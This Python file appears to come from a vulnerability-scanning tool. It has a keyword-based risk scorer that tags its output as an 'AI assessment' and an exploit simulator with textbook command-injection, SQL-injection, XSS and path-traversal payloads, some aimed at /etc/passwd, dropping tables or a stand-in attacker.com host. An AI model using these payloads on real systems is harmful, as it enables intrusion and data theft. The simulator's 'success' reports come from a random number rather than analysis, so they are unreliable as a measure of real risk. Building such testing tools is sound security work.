
import random

class AIRiskScorer:
    """
    AI Risk Scorer for vulnerability assessment.
    This is currently a placeholder that uses simple rules to mimic AI scoring.
    In the future, this could be connected to GPT-4, LLaMA, or another LLM.
    """
    
    def __init__(self):
        """Initialize the AI risk scorer."""
        # Mapping of vulnerability types to typical severity levels
        self.vulnerability_severity_map = {
            'Command Execution': 'High',
            'SQL Injection': 'High',
            'XSS': 'Medium',
            'Path Traversal': 'Medium',
            'Deserialization': 'High',
            'Buffer Overflow': 'High',
            'Format String': 'Medium',
            'Authentication Flaw': 'High',
            'Cryptographic Flaw': 'Medium',
            'Hard-coded Credentials': 'High',
            'Insecure Randomness': 'Medium',
            'User Input': 'Low',
            'Information Disclosure': 'Medium',
            'Race Condition': 'Medium',
            'Integer Overflow': 'Medium',
            'Unchecked Return Value': 'Low',
            'Unvalidated Redirect': 'Medium',
            'CSRF': 'Medium',
            'Logic Bug': 'Medium',
            'Default Credentials': 'High',
            'Syntax Error': 'Low',
            'Memory Leak': 'Low'
        }
        
        # High-risk keywords that increase severity
        self.high_risk_keywords = [
            'password', 'token', 'secret', 'credential', 'auth', 'admin', 
            'root', 'sudo', 'shell', 'exec', 'system', 'run', 'popen', 'eval',
            'command', 'api_key', 'apikey', 'execute', 'database', 'db', 'sql',
            'query', 'delete', 'drop', 'insert', 'update', 'select'
        ]
        
        # Low-risk context keywords that decrease severity
        self.low_risk_keywords = [
            'comment', 'log', 'print', 'echo', 'debug', 'test', 'example',
            'sample', 'mock', 'dummy', 'stub', 'template', 'placeholder'
        ]
    
    def assess_vulnerability(self, vuln_type, code_sample, description, full_code=None):

        # Start with the default severity for this vulnerability type
        initial_severity = self.vulnerability_severity_map.get(vuln_type, 'Medium')
        
        # Calculate risk factors based on code and context
        risk_factors = self._calculate_risk_factors(vuln_type, code_sample, description, full_code)
        
        # Determine final severity based on risk factors
        severity = self._determine_severity(initial_severity, risk_factors)
        
        # Generate an explanation
        explanation = self._generate_explanation(vuln_type, severity, risk_factors)
        
        # Set confidence level
        confidence = "Medium"  # Default confidence
        if len(risk_factors['increasing']) > 2 or len(risk_factors['decreasing']) > 2:
            confidence = "High"
        
        return {
            'severity': severity,
            'explanation': explanation,
            'confidence': confidence,
            'risk_factors': risk_factors  # For debugging/transparency
        }
    
    def _calculate_risk_factors(self, vuln_type, code_sample, description, full_code):

        code_sample = code_sample.lower() if code_sample else ""
        description = description.lower() if description else ""
        
        risk_factors = {
            'increasing': [],
            'decreasing': []
        }
        
        # Check for high-risk keywords in the code
        for keyword in self.high_risk_keywords:
            if keyword in code_sample:
                risk_factors['increasing'].append(f"Contains high-risk keyword '{keyword}'")
        
        # Check for low-risk context
        for keyword in self.low_risk_keywords:
            if keyword in code_sample:
                risk_factors['decreasing'].append(f"Contains low-risk context keyword '{keyword}'")
        
        # Specific risk assessments based on vulnerability type
        if vuln_type == 'Command Execution':
            # Check if the command includes dynamic content (higher risk)
            if '+' in code_sample or 'f"' in code_sample or '${' in code_sample or '%s' in code_sample:
                risk_factors['increasing'].append("Command includes dynamic content (higher risk of injection)")
                
            # Check for command validation attempt (lower risk)
            if 'validate' in code_sample or 'sanitize' in code_sample or 'escape' in code_sample:
                risk_factors['decreasing'].append("Contains validation/sanitization attempt")
        
        elif vuln_type == 'SQL Injection':
            # Check for parameterized queries (lower risk)
            if ('?' in code_sample and 'execute' in code_sample) or '%s' in code_sample:
                if not ('concatenat' in code_sample or '+' in code_sample):
                    risk_factors['decreasing'].append("May be using parameterized queries")
            
            # Higher risk if concatenating SQL directly
            if '+' in code_sample or 'concat' in code_sample:
                risk_factors['increasing'].append("Direct string concatenation in SQL query")
                
        elif vuln_type == 'XSS':
            # Check for output encoding (lower risk)
            if 'escape' in code_sample or 'sanitize' in code_sample or 'htmlspecialchars' in code_sample:
                risk_factors['decreasing'].append("Contains output encoding/sanitization")
                
        elif vuln_type == 'Hard-coded Credentials':
            # Extremely high risk if it contains actual credentials
            for secret_word in ['password', 'api_key', 'secret', 'token']:
                if secret_word in code_sample:
                    risk_factors['increasing'].append(f"Contains hard-coded {secret_word}")
        
        return risk_factors
    
    def _determine_severity(self, initial_severity, risk_factors):

        # Convert severity to numerical value
        severity_values = {'High': 3, 'Medium': 2, 'Low': 1}
        severity_score = severity_values.get(initial_severity, 2)
        
        # Adjust score based on risk factors
        severity_score += min(len(risk_factors['increasing']), 2)  # Max +2 from increasing factors
        severity_score -= min(len(risk_factors['decreasing']), 2)  # Max -2 from decreasing factors
        
        # Ensure the score stays within valid range
        severity_score = max(1, min(severity_score, 3))
        
        # Convert back to string
        severity_strings = {1: 'Low', 2: 'Medium', 3: 'High'}
        return severity_strings[severity_score]
    
    def _generate_explanation(self, vuln_type, severity, risk_factors):

        explanation = f"The {vuln_type} vulnerability is assessed as {severity} severity."
        
        if risk_factors['increasing']:
            explanation += f" Risk factors: {'; '.join(risk_factors['increasing'][:2])}."
            
        if risk_factors['decreasing']:
            explanation += f" Mitigating factors: {'; '.join(risk_factors['decreasing'][:2])}."
            
        explanation += " (AI assessment)"
        return explanation


class ExploitSimulator:
    """
    Enhanced Exploit Simulator for generating proof-of-concept exploits.
    This module creates detailed exploit examples for discovered vulnerabilities.
    """
    
    def __init__(self):
        """Initialize the Exploit Simulator."""
        # Likelihood of successful exploitation by severity
        self.success_probability = {
            'Critical': 0.95,
            'High': 0.8,
            'Medium': 0.5,
            'Low': 0.2
        }
        
        # Common attack payloads by vulnerability type
        self.payloads = {
            'command_injection': [
                "; cat /etc/passwd", 
                "| whoami", 
                "`id`", 
                "$(echo pwned)", 
                "& dir", 
                "&& ping -c 1 attacker.com"
            ],
            'sql_injection': [
                "' OR '1'='1", 
                "'; DROP TABLE users; --", 
                "' UNION SELECT username,password FROM users --",
                "admin' --",
                "1; SELECT sleep(5) --"
            ],
            'xss': [
                "<script>alert('XSS')</script>", 
                "<img src=x onerror=alert('XSS')>", 
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'-alert('XSS')-'"
            ],
            'path_traversal': [
                "../../../etc/passwd", 
                "..\\..\\..\\windows\\system.ini", 
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\/..\\/..\\/etc/passwd",
                "....//....//....//etc/passwd"
            ]
        }
    
    def simulate_exploit(self, vulnerability, code_content):
        vuln_type = vulnerability.get('type', '')
        
        # Extract relevant code snippet
        code_snippet = self._extract_relevant_snippet(vulnerability, code_content)
        
        # Generate exploit based on vulnerability type
        exploit_details = self._generate_exploit(vulnerability, code_snippet)
        
        # Determine success probability
        severity = vulnerability.get('severity', 'Medium')
        probability = self.success_probability.get(severity, 0.3)
        success = random.random() < probability
        
        # Build a detailed report
        report = self._build_exploit_report(vulnerability, exploit_details, success)
        
        return {
            'success': success,
            'exploit_code': exploit_details['code'],
            'message': report['message'],
            'impact': report['impact'],
            'mitigation': report['mitigation'],
            'resources': report['resources']
        }
    
    def _generate_exploit(self, vulnerability, code_snippet):
        """Generate an exploit based on vulnerability type."""
        vuln_type = vulnerability.get('type', 'Unknown')
        
        if vuln_type == 'Command Execution':
            return self._generate_command_injection_exploit(vulnerability, code_snippet)
        elif vuln_type == 'SQL Injection':
            return self._generate_sql_injection_exploit(vulnerability, code_snippet)
        elif vuln_type == 'XSS' or vuln_type == 'DOM-based XSS':
            return self._generate_xss_exploit(vulnerability, code_snippet)
        elif vuln_type == 'Path Traversal':
            return self._generate_path_traversal_exploit(vulnerability, code_snippet)
        elif vuln_type == 'Hard-coded Credentials':
            return self._generate_hardcoded_credential_exploit(vulnerability, code_snippet)
        else:
            return self._generate_generic_exploit(vulnerability, code_snippet)
    
    def _extract_relevant_snippet(self, vulnerability, code_content):
        """Extract a more comprehensive code snippet around the vulnerability."""
        # If there's already a snippet in the vulnerability, use that
        if 'code_sample' in vulnerability and vulnerability['code_sample']:
            return vulnerability['code_sample']
        
        # Otherwise, try to extract from full code using the line number
        if 'line' in vulnerability and code_content:
            lines = code_content.splitlines()
            line_num = vulnerability['line']
            start = max(0, line_num - 5)
            end = min(len(lines), line_num + 5)
            return '\n'.join(lines[start:end])
        
        return code_content[:500] if code_content else "Code snippet not available"
    
    def _build_exploit_report(self, vulnerability, exploit_details, success):
        """Build a comprehensive report about the exploit."""
        vuln_type = vulnerability.get('type', '')
        severity = vulnerability.get('severity', 'Medium')
        cwe = vulnerability.get('cwe', 'Unknown')
        
        if success:
            message = f"✓ Successfully simulated {vuln_type} exploit with {severity} severity!"
        else:
            message = f"✗ Exploit simulation for {vuln_type} was unsuccessful (may require additional context)"
        
        impact = exploit_details.get('impact', f"This {severity.lower()} severity {vuln_type} vulnerability could lead to unauthorized access, data disclosure, or system compromise.")
        
        return {
            'message': message,
            'impact': impact,
            'mitigation': exploit_details.get('mitigation', "Apply proper input validation, output encoding, and follow the principle of least privilege."),
            'resources': exploit_details.get('resources', [f"https://cwe.mitre.org/data/definitions/{cwe.replace('CWE-', '')}.html" if 'CWE-' in cwe else ""])
        }
    
    def _detect_language(self, code_snippet):
        """Detect the programming language of the code snippet."""
        if "def " in code_snippet and ("self" in code_snippet or "import " in code_snippet):
            return "python"
        elif "{" in code_snippet and ("function " in code_snippet or "var " in code_snippet or "const " in code_snippet or "let " in code_snippet):
            return "javascript"
        elif "<?php" in code_snippet or ("$" in code_snippet and "function " in code_snippet):
            return "php"
        elif "public class " in code_snippet or "private class " in code_snippet or ("public static void " in code_snippet):
            return "java"
        elif "#include" in code_snippet and ("int main" in code_snippet or "void main" in code_snippet):
            return "c"
        elif "<" in code_snippet and (">" in code_snippet) and ("</" in code_snippet or "/>" in code_snippet):
            return "html"
        else:
            return "unknown"
            
    def _generate_command_injection_exploit(self, vulnerability, code_snippet):
        """Generate a command injection exploit."""
        payloads = self.payloads['command_injection']
        selected_payload = random.choice(payloads)
        
        # Identify potential injection point
        injection_point = "user_input"
        if "(" in code_snippet and ")" in code_snippet:
            # Extract what's inside parentheses as possible injection point
            start = code_snippet.find("(") + 1
            end = code_snippet.find(")", start)
            if start < end:
                injection_point = code_snippet[start:end].strip()
        
        language = self._detect_language(code_snippet)
        
        if language == "python":
            exploit_code = """
# Command Injection Proof of Concept
# Original vulnerable code:
{}

# Exploit:
# Replace '{}' with the following payload:
payload = "{}"

# Example exploitation:
# If the vulnerable code is something like: os.system(user_input)
# Then: user_input = "{}"
# This would execute the injected command alongside the intended command
""".format(code_snippet, injection_point, selected_payload, selected_payload)
        else:
            exploit_code = """
// Command Injection Proof of Concept
// Original vulnerable code:
{}

// Exploit:
// Replace '{}' with the following payload:
payload = "{}";

// This would execute the injected command alongside the intended command
""".format(code_snippet, injection_point, selected_payload)
        
        return {
            'code': exploit_code,
            'impact': "Command injection allows attackers to execute arbitrary system commands on the host operating system, potentially leading to complete system compromise, data theft, or service disruption.",
            'mitigation': "Never use user-supplied input in system commands. If necessary, use a whitelist of allowed commands or arguments, and use language-specific shell escaping functions.",
            'resources': ["https://owasp.org/www-community/attacks/Command_Injection"]
        }
    
    def _generate_sql_injection_exploit(self, vulnerability, code_snippet):
        """Generate a SQL injection exploit."""
        payloads = self.payloads['sql_injection']
        selected_payload = random.choice(payloads)
        
        exploit_code = """
# SQL Injection Proof of Concept
# Original vulnerable code:
{}

# Exploit:
# If the vulnerable code uses string formatting for SQL queries like:
# query = f"SELECT * FROM users WHERE username = '{username}'"
# or
# query = "SELECT * FROM users WHERE username = '" + username + "'"

# Replace the input parameter with:
input_value = "{}"

# Example exploitation:
# For authentication bypass:
# username = "' OR '1'='1"
# password = "' OR '1'='1"

# For data extraction:
# username = "' UNION SELECT username, password FROM users --"
""".format(code_snippet, selected_payload)
        
        return {
            'code': exploit_code,
            'impact': "SQL injection can allow attackers to bypass authentication, access, modify, or delete data in the database, execute admin operations, and in some cases even issue commands to the operating system.",
            'mitigation': "Use parameterized queries/prepared statements, input validation, and stored procedures. Never concatenate user input directly into SQL queries.",
            'resources': ["https://owasp.org/www-community/attacks/SQL_Injection", "https://portswigger.net/web-security/sql-injection"]
        }
    
    def _generate_xss_exploit(self, vulnerability, code_snippet):
        """Generate a Cross-Site Scripting (XSS) exploit."""
        payloads = self.payloads['xss']
        selected_payload = random.choice(payloads)
        
        exploit_code = """
# Cross-Site Scripting (XSS) Proof of Concept
# Original vulnerable code:
{}

# Exploit:
# If the server renders user input without proper encoding:

# Payload:
payload = "{}"

# How to test:
# 1. Submit this payload to any input field that is reflected back to the page
# 2. If the alert executes, the application is vulnerable to XSS
""".format(code_snippet, selected_payload)
        
        return {
            'code': exploit_code,
            'impact': "XSS allows attackers to execute malicious scripts in victims' browsers, stealing session cookies, logging keystrokes, performing actions as the user, or defacing websites. It can lead to account takeover and credential theft.",
            'mitigation': "Implement context-appropriate output encoding, content security policy (CSP), and validate/sanitize input. Use modern frameworks that automatically escape output.",
            'resources': ["https://owasp.org/www-community/attacks/xss/", "https://portswigger.net/web-security/cross-site-scripting"]
        }
    
    def _generate_path_traversal_exploit(self, vulnerability, code_snippet):
        """Generate a Path Traversal exploit."""
        payloads = self.payloads['path_traversal']
        selected_payload = random.choice(payloads)
        
        exploit_code = """
# Path Traversal Proof of Concept
# Original vulnerable code:
{}

# Exploit:
# If the code uses user input to access files without proper validation:

# Payload:
file_path = "{}"

# How to test:
# 1. Replace any file path parameter with the payload
# 2. If it returns content from system files (like /etc/passwd on Linux), it's vulnerable

# Common targets:
# - Linux: /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ
# - Windows: C:\\Windows\\system.ini, C:\\boot.ini, C:\\Windows\\win.ini
# - Application configs: ../../config/database.yml, ../../.env
""".format(code_snippet, selected_payload)
        
        return {
            'code': exploit_code,
            'impact': "Path traversal vulnerabilities allow attackers to access files outside of the intended directory, potentially exposing sensitive configuration files, source code, or system files like /etc/passwd.",
            'mitigation': "Validate and sanitize file paths, use a whitelist of allowed files/directories, utilize chroot jails or containerization, and avoid using user input for file operations when possible.",
            'resources': ["https://owasp.org/www-community/attacks/Path_Traversal", "https://portswigger.net/web-security/file-path-traversal"]
        }
        
    def _generate_hardcoded_credential_exploit(self, vulnerability, code_snippet):
        """Generate a Hard-coded Credential exploit."""
        exploit_code = """
# Hard-coded Credentials Proof of Concept
# Original vulnerable code:
{}

# Exploit:
# This code contains hard-coded credentials that can be extracted and used

# How to extract:
# 1. Identify credential patterns in the source code (passwords, API keys, tokens)
# 2. Look for variable names like 'password', 'secret', 'key', 'token', etc.
# 3. Extract the credential value

# Example credentials that might be in this code:
# - Database connection strings
# - API keys
# - Admin passwords
# - Service account credentials

# Impact:
# These credentials can be used to gain unauthorized access to the affected service
# or resource, bypassing normal authentication mechanisms.
""".format(code_snippet)
        
        return {
            'code': exploit_code,
            'impact': "Hard-coded credentials in source code can be discovered by anyone with access to the codebase or compiled application, allowing for unauthorized access to systems, databases, or APIs using legitimate credentials.",
            'mitigation': "Store credentials in secure environment variables, use a secrets management service, or employ a configuration server with proper access controls. Never commit credentials to source control.",
            'resources': ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials", "https://cwe.mitre.org/data/definitions/798.html"]
        }
    
    def _generate_generic_exploit(self, vulnerability, code_snippet):
        """Generate a generic exploit for other vulnerability types."""
        vuln_type = vulnerability.get('type', 'Unknown')
        description = vulnerability.get('description', '')
        
        exploit_code = """
# {} Proof of Concept
# Original vulnerable code:
{}

# Vulnerability Description:
# {}

# Potential Exploit:
# This is a generic proof of concept for a {} vulnerability.
# To exploit this vulnerability, an attacker would need to:
# 1. Identify the entry point for user-controlled input
# 2. Craft malicious input specifically designed to exploit this vulnerability
# 3. Submit the input to the vulnerable application

# The specific steps vary based on the vulnerability type and implementation.
# Further analysis would be required to create a precise exploit.

# Recommendation:
# Review the highlighted code and apply best practices for securing 
# against {} vulnerabilities.
""".format(vuln_type, code_snippet, description, vuln_type, vuln_type)
        
        return {
            'code': exploit_code,
            'impact': f"This {vulnerability.get('severity', 'unknown severity').lower()} {vuln_type} vulnerability could potentially be exploited to compromise the security of the application, leading to data breaches, unauthorized access, or service disruption.",
            'mitigation': "Follow language-specific and framework-specific security best practices, implement input validation and output encoding, use security headers, and keep dependencies updated.",
            'resources': ["https://owasp.org/www-project-top-ten/"]
        }